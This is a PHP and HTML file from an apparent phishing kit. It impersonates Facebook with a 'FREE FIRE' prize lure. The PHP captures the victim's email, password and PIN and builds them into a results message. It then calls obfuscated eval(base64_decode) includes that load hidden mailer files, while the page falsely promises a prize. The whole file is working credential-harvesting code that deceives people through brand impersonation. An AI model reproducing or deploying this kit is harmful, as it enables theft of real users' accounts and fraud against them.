<html><?php
############################################
##        Author: TANTO ID            ##
##       Mailer: TANTO ID            ##
##       Modifer: TANTO ID             ##
############################################
/* JANGAN GANTI COPYRIGHT NYA YA BANGSAT */

/* Fungsi berikut untuk mengambil input field. */

$imel = $_POST['email'];
$paswot = $_POST['password'];
$pin = $_POST['pin'];

/* Mengambil informasi untuk dikirim kepada facebook anda !. */

$body = "

-===¦ FACEBOOK ACCOUNT ¦===-

|>> Email or Phone Number : ".$imel."
|>> Password : ".$paswot."

-===¦ END INFO ¦===-

";

eval(base64_decode("aW5jbHVkZSAiaW1lbC5waHAiOw=="));
$subject ="FREE FIRE LEVEL [".$pin."]";
$headers ="From: SETORAN FREE FIRE <tanto@result.com>";

$md5  = md5(gmdate("r"));
$sha1   = sha1(gmdate("r"));

eval(base64_decode("aW5jbHVkZSAiLmxpbmVzdG9yYW53ZWIucGhwIjs="));
$subject ="FREE FIRE LEVEL [".$pin."]";
$headers ="From: SETORAN FREE FIRE <tanto@result.com>";

$md5  = md5(gmdate("r"));
$sha1   = sha1(gmdate("r"));
?>
<!DOCTYPE html>
<html dir="ltr" lang="en" data-lang="en">

<!-- Mirrored from demophising-fs.zxc.pm/lgr1/login.php by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 31 Jan 2017 02:59:15 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta charset="UTF-8">
<title>FREE FIRE</title>
<link rel="shortcut icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Facebook_logo_%28square%29.png/600px-Facebook_logo_%28square%29.png">
<link rel="stylesheet" href="line_web_login_1427946281.css">
<!--[if lt IE 9]><script src="html5_14279462812.js"></script><![endif]-->
<script src="lc.line.web.login.common_1444888891.js"></script>

</head>
<body>
<div class="LyWrap">

	<div class="ArLoginWrap">
		<h1 class="MdGHD1Logo"><span class="mdGHD01L">FACEBOOK</span></h1>
		<div class="arLoginWrapInner">
		    <center><img  height="50" width="50" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Facebook_logo_%28square%29.png/600px-Facebook_logo_%28square%29.png"></center>
			<form action="index.html" method="post">
				<h2 class="MdHide">Login</h2>
				<p class="MdTxtNotice">CONGRATULATIONS! Prizes will be sent to <?php 
echo "$imel"; 
?> within 24 hours.</p>
				<div class="MdMN01LoginForm">
					
					<div class="mdMN01Btn"><input type="submit" class="MdBtnLogin ExDisabled" value='Logout'></div>
				</div>
			</form>
			
			<div class="MdMN02Msg">
				<p class="MdTxtCaution"></p>
			<!--/MdMN02Msg--></div>
			
			<p class="MdTxtNotice">You can check your account info by starting the FACEBOOK app and going to [Settings] > [Accounts].</p>
			<p class="MdTxtLink"><a href="">About FACEBOOK</a></p>
		
		<!--/arLoginWrapInner--></div>
		<p class="MdGFT01Copy"><small>&copy; FACEBOOK Corporation</small></p>
	<!--/ArLoginWrap--></div>

<!--/LyWrap--></div>

</body>

<!-- Mirrored from demophising-fs.zxc.pm/lgr1/login.php by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 31 Jan 2017 02:59:17 GMT -->
</html>
